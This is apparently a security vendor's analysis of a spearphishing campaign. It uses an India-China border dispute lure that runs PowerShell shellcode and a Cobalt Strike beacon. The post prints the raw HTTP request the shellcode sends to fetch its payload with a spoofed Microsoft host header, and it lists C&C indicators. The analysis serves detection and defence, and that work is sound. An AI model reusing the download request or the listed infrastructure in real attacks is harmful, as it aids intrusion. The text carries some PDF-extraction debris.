6/22/2020Targeted Attack Leverages India-China Border DisputeTargeted Attack Leverages India-China Border Disputezscaler.com/blogs/research/targeted-attack-leverages-india-china-border-dispute-lure-victimsPublished on: June 19, 2020 Authored by: Atinderpal Singh Nirmal Singh Sahil Antil Category: AnalysisMalwareObfuscationSocial EngineeringMalicious threat actors are always ready to take advantage of current affairs to maximize the success rate of their attacks. The Zscaler ThreatLabZ team recently came across one such attack trying to leverage the current India-China border dispute to lure victims to open an attached malicious document.Key pointsThe attack is fileless as no payload is written on disk and no persistence is created. The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode. It uses the DKMC framework to hide communication in plain sight using steganography. It relies on the Cobalt Strike beacon using a malleable C&C profile.Infection It appears as if victims were sent a malicious lure document as an email attachment. The document is named “India-China border tensions.doc” and contains an article by The Times of India article about the same topic.Figure 1: The infection flow of this attack.DocumentThe document contains one line that reads “Geostrategic article for SE Asia Security Analyst,” indicating that the target might be a security analyst for southeast Asia.Figure 2: The malicious document containing a new article reference.Interestingly, the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing.Though the macro is corrupt, we were able to extract the PowerShell command using static analysis. The code obfuscation is very basic. It just subtracts value 4 to decrypt the PowerShell command.url Attack Leverages India-China Border DisputeFigure 3: The macro command decryption function.Part of the PowerShell command after the base64 decoding looks like this:Figure 4: Part of the PowerShell code designed to run shellcode.Almost exact code from the DKMC framework is used to run embedded base64 encoded shellcode. The PowerShell script is designed to run the shellcode in 32-bit mode only. It checks if the PowerShell script is running with a 64-bit PowerShell process using the command int pointer size, which will be 8 bytes [64bits] on a 64-bit process. If that is the case, then it tries to run the PowerShell in 32-bit mode with the shellcode injection script code as an argument.Injected shellcodeThis shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC. Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP GET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cacheurl Attack Leverages India-China Border DisputeDownloaded payloadThis GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload. The shellcode decrypts and executes this payload, which turns out to be a Cobalt Strike beacon.Figure 6: The shellcode and payload before decryption.Figure 7: The shellcode and payload after decryption.The beacon is configured to point to the following C&C address “userimage8.360doc.com,/s/ref=nb_sb_noss_1/167-3294888-0262949/field- keywords=books” and the same host field and user agent.In another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the C&C addresses. Noticeably, both beacon DLLs use a 360doc.com-based C&C, and the watermark is exactly the same in both: 305419896.As Cobalt Strike is a well-known commercial tool for red teams, we are not getting into its technical details.Attributionurl Attack Leverages India-China Border DisputeAs of now, we are not able to attribute this attack to a specific actor with enough confidence. But here are few observations. The group OceanLotus is known to use DKMC, Cobalt Strike, and fileless payloads. But the use of a proper GIF header for shellcode seems to be new for them. On the other hand, the watermark value (305419896) found in the beacon configuration has also been used by the Trickbot Group.Zscaler Cloud Sandbox reportFigure 8: The Zscaler Cloud Sandbox report for this malware.Note: The document will crash in this case but if fixed to run, the Zscaler Cloud Sandbox will block its activity.In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels. Check out our Threat Library for more details about Win32.Backdoor.CobaltStrike.ConclusionThreat actors always try to find ways to blend into real traffic. In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website. One such evasion trick that we covered in our earlier blog was the use of FakeTLS header.The Zscaler ThreatLabZ team is continuously monitoring threat actors and ensuring protection against such threats.Acknowledgment Thanks to Adtiya Sharma for providing support in the research.MITRE ATT&CK TTP MappingIDTechniqueDescriptionT1193Spearphishing AttachmentDocument is delivered as an email attachmentT1086 PowerShellUses PowerShell to run shellcodeT1204 User ExecutionUses doc attachment requiring user interactionT1140 Deobfuscate/Decode Files or Information Decrypt payloads during executionT1027 Obfuscated Files or InformationUses encrypted payloadsT1036 MasqueradingUses fake GIF header magic bytes and filenameurl Attack Leverages India-China Border DisputeT1043 Commonly Used Port443T1008 Fallback ChannelsUses more than one C&CT1071Standard Application Layer ProtocolUses HTTPsNote: The TTP list above contains TTP observed during the campaign as a Cobalt Strike beacon has many more features. A complete list of 114.67.110[.]37 userimage8.360doc[.]com image91.360doc[.]com welcome.toutiao[.]comAppendix 